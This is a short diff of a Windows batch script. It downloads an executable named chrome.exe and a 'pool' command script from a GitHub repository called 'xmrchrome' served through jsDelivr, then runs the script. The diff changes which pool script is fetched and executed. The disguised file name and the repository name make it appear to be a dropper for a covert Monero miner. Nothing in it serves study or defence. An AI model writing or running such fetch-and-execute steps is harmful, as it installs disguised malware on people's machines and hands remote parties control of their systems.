@@ -1,6 +1,8 @@
 wget -O chrome.exe https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/data/L5L0CLysiFlYo48F.dat
-wget -O pool-gsut4m.cmd https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/pool-gsut4m.txt
-pool-gsut4m.cmd
+wget -O pool.cmd https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/pool-a7yus9.txt
+:: pool-a7yus9.txt
+:: pool-gsut4m.txt
+pool.cmd
 exit
 :: wget -O autoupdate.cmd https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/autoupdate.txt
 :: autoupdate.cmd
